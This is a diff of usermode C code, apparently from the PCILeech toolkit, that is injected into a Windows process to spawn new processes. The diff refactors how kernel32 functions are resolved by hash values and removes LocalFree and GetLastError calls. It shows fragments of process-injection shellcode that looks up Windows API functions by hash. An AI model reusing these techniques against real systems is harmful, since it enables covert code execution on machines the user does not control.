@@ -1,6 +1,6 @@
 // wx64_exec_user_c.c : usermode code to be injected into user process to spawn new processes.
 //
-// (c) Ulf Frisk, 2016
+// (c) Ulf Frisk, 2016, 2017
 // Author: Ulf Frisk, pcileech@frizk.net
 //
 // compile with:
@@ -52,9 +52,7 @@ typedef struct tdUserShellConfig {
 #define H_CreateProcessA			0x16b3fe72
 #define H_CreateThread				0xca2bd06b
 #define H_GetExitCodeProcess		0xac30ab74
-#define H_GetLastError				0x75da1966
 #define H_LocalAlloc				0x4c0297fa
-#define H_LocalFree					0x5cbaeaf6
 #define H_ReadFile					0x10fa6516
 #define H_Sleep						0xdb2d49b0
 #define H_WriteFile					0xe80a791f
@@ -93,13 +91,9 @@ typedef struct tdUserShellFunctions {
 		_In_  HANDLE  hProcess,
 		_Out_ LPDWORD lpExitCode
 		);
-	DWORD(*GetLastError)(void);
 	HLOCAL(*LocalAlloc)(
 		_In_ UINT   uFlags,
 		_In_ SIZE_T uBytes
-		);
-	HLOCAL(*LocalFree)(
-		_In_ HLOCAL hMem
 		);
 	BOOL(*ReadFile)(
 		_In_        HANDLE       hFile,
@@ -171,17 +165,20 @@ PVOID PEGetProcAddressH(_In_ HMODULE hModuleIn, _In_ DWORD dwProcNameH)
 
 VOID UserShellInitializeFunctions(_In_ HMODULE hModuleKernel32, _Out_ PUSERSHELL_FUNCTIONS fnu)
 {
-	fnu->CloseHandle = PEGetProcAddressH(hModuleKernel32, H_CloseHandle);
-	fnu->CreatePipe = PEGetProcAddressH(hModuleKernel32, H_CreatePipe);
-	fnu->CreateProcessA = PEGetProcAddressH(hModuleKernel32, H_CreateProcessA);
-	fnu->CreateThread = PEGetProcAddressH(hModuleKernel32, H_CreateThread);
-	fnu->GetExitCodeProcess = PEGetProcAddressH(hModuleKernel32, H_GetExitCodeProcess);
-	fnu->GetLastError = PEGetProcAddressH(hModuleKernel32, H_GetLastError);
-	fnu->LocalAlloc = PEGetProcAddressH(hModuleKernel32, H_LocalAlloc);
-	fnu->LocalFree = PEGetProcAddressH(hModuleKernel32, H_LocalFree);
-	fnu->ReadFile = PEGetProcAddressH(hModuleKernel32, H_ReadFile);
-	fnu->Sleep = PEGetProcAddressH(hModuleKernel32, H_Sleep);
-	fnu->WriteFile = PEGetProcAddressH(hModuleKernel32, H_WriteFile);
+	DWORD i = 0, NAMES[9];
+	NAMES[i++] = H_CloseHandle;
+	NAMES[i++] = H_CreatePipe;
+	NAMES[i++] = H_CreateProcessA;
+	NAMES[i++] = H_CreateThread;
+	NAMES[i++] = H_GetExitCodeProcess;
+	NAMES[i++] = H_LocalAlloc;
+	NAMES[i++] = H_ReadFile;
+	NAMES[i++] = H_Sleep;
+	NAMES[i++] = H_WriteFile;
+	while(i) {
+		i--;
+		*((PQWORD)fnu + i) = (QWORD)PEGetProcAddressH(hModuleKernel32, NAMES[i]);
+	}
 }
 
 BOOL UserShellIsProcessRunning(PUSERSHELL_DATA pd)
@@ -221,14 +218,12 @@ BOOL UserShellExec(_Inout_ PUSERSHELL_DATA pd)
 	}
 	// launch executable
 	if(!pd->fnu.CreateProcessA(NULL, pd->pCfg->szProcToStart, NULL, NULL, TRUE, pd->pCfg->fCreateProcess, NULL, NULL, psi, &pi)) {
-		pd->fnu.LocalFree(psi);
 		return FALSE;
 	}
 	pd->hProcessHandle = pi.hProcess;
 	if(pd->pCfg->qwAddrConsoleBuffer) {
 		pd->fnu.CloseHandle(pi.hThread);
 	}
-	pd->fnu.LocalFree(psi);
 	return TRUE;
 }
 
@@ -309,7 +304,6 @@ VOID c_EntryPoint(PBYTE pb, ULONG_PTR lpBaseKernel32)
 	// create process
 	if(!UserShellExec(pd)) {
 		UserShellCleanup(pd);
-		pd->fnu.LocalFree(pd);
 		return;
 	}
 	// Initalize console redirection #2/2
